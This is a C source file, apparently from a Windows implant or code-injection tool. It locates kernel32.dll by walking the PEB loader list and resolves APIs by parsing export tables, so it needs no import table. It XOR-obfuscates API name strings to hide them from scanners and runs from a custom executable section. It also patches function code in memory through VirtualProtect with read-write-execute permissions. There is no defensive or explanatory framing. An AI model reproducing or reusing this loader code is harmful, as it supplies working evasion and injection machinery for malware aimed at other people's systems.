#include "WinApiWrapper.h"
#include "crt.h"

#pragma section("wineop", read, execute)
#pragma code_seg("wineop")

HANDLE GetKernel32Module( void )
{
	HANDLE hKernel32 = INVALID_HANDLE_VALUE;
	wchar_t szKernel32[] = { 'k'^XOR_KEY, 'e'^XOR_KEY, 'r'^XOR_KEY,
		'n'^XOR_KEY, 'e'^XOR_KEY, 'l'^XOR_KEY, '3'^XOR_KEY, '2'^XOR_KEY,
		'.'^XOR_KEY, 'd'^XOR_KEY, 'l'^XOR_KEY, 'l'^XOR_KEY, '\0'^XOR_KEY
	};
#ifdef _WIN64
		PPEB lpPeb = (PPEB) __readgsqword(0x60);
#else
		PPEB lpPeb = (PPEB) __readfsdword(0x30);
#endif
		PLIST_ENTRY pListHead = &lpPeb->Ldr->InMemoryOrderModuleList;
		PLIST_ENTRY pListEntry = pListHead->Flink;	

		while (pListEntry != pListHead)
		{
			PLDR_DATA_TABLE_ENTRY pModEntry = CONTAINING_RECORD(pListEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
			if (pModEntry->FullDllName.Length)
			{
				PWCHAR strName = &pModEntry->FullDllName.Buffer[pModEntry->FullDllName.Length/sizeof(WCHAR) - 12];

				if (!__WMEMCMP__(strName, szKernel32, _countof(szKernel32), TRUE, XOR_KEY))
				{
					hKernel32 = (HANDLE)pModEntry->DllBase;
					break;
				}
			}
			pListEntry = pListEntry->Flink;
		}

		return hKernel32;
}

FARPROC WINAPI GetProcAddr( __in HANDLE hModule, __in LPVOID lpProcName, __in size_t count, __in unsigned char xorKey /*= 0 */ )
{
	if (hModule == INVALID_HANDLE_VALUE || hModule == NULL)
	{
		hModule = GetKernel32Module();
	}

	if (hModule == INVALID_HANDLE_VALUE || hModule == NULL)
		return NULL;

	LPBYTE lpBaseAddr = (LPBYTE) hModule;
	PIMAGE_DOS_HEADER lpDosHdr = (PIMAGE_DOS_HEADER) lpBaseAddr;
	PIMAGE_NT_HEADERS pNtHdrs = (PIMAGE_NT_HEADERS) (lpBaseAddr + lpDosHdr->e_lfanew);
	PIMAGE_EXPORT_DIRECTORY pExportDir = (PIMAGE_EXPORT_DIRECTORY) (lpBaseAddr + pNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	LPDWORD pNameArray = (LPDWORD) (lpBaseAddr + pExportDir->AddressOfNames);
	LPDWORD pAddrArray = (LPDWORD) (lpBaseAddr + pExportDir->AddressOfFunctions);
	LPWORD pOrdArray  = (LPWORD) (lpBaseAddr+ pExportDir->AddressOfNameOrdinals);

	for (DWORD i = 0; i < pExportDir->NumberOfNames; ++i)
	{
		LPSTR pFuncName = (LPSTR) (lpBaseAddr + pNameArray[i]);
		if (__MEMCMP__(pFuncName, lpProcName, count, FALSE, xorKey) == 0)
		{
			return  (FARPROC) (lpBaseAddr + pAddrArray[pOrdArray[i]]);
		}
	}

	return NULL;
}

BOOL GetApiFunctions( __inout LPENVIRONMENT environment )
{
	HANDLE hKernel32 = GetKernel32Module();
	if (hKernel32 == INVALID_HANDLE_VALUE)
		return FALSE;

	unsigned char szGetProcAddress[] = { 'G' ^ XOR_KEY, 'e' ^ XOR_KEY, 't' ^ XOR_KEY, 'P' ^ XOR_KEY, 'r' ^ XOR_KEY, 'o' ^ XOR_KEY, 'c' ^ XOR_KEY, 'A' ^ XOR_KEY, 'd' ^ XOR_KEY, 'd' ^ XOR_KEY, 'r' ^ XOR_KEY, 'e' ^ XOR_KEY, 's' ^ XOR_KEY, 's' ^ XOR_KEY, '\0' ^ XOR_KEY };

	GETPROCADDRESS fpGetProcAddress = (GETPROCADDRESS)GetProcAddr((HMODULE)hKernel32, szGetProcAddress, _countof(szGetProcAddress), XOR_KEY);
	if (fpGetProcAddress == NULL) return FALSE;
	environment->lpWinapiTable->GetProcAddress = fpGetProcAddress;
	return GetFunctionStub((HMODULE)hKernel32, environment);
}

BOOL WINAPI FixPointer(__in LPENVIRONMENT lpEnv, __in LPVOID lpFunction, __in DWORD_PTR tag)
{
	BOOL bSuccess = FALSE;
	LPCWINAPI_TABLE lpTable = lpEnv->lpWinapiTable;
	LPBYTE lpDefWindowProcCaller = (LPBYTE)(lpFunction);
	for (ULONG i = 0; i < 0x40; ++i )
	{
		if (lpDefWindowProcCaller[i] == 0xc3) // ret
			break;
		if (lpDefWindowProcCaller[i] == 0xc2) // ret
			break;
		if (*(DWORD*)&lpDefWindowProcCaller[i] == tag)
		{
			DWORD dwOut;
			if (lpTable->VirtualProtect(&lpDefWindowProcCaller[i], sizeof(void*), PAGE_EXECUTE_READWRITE, &dwOut))
			{
				*(DWORD_PTR*)&lpDefWindowProcCaller[i] = (DWORD_PTR)lpEnv;
				bSuccess = TRUE;
				lpTable->VirtualProtect(&lpDefWindowProcCaller[i], sizeof(void*), dwOut, &dwOut);
			}
			break;
		}
	}
	return bSuccess;
}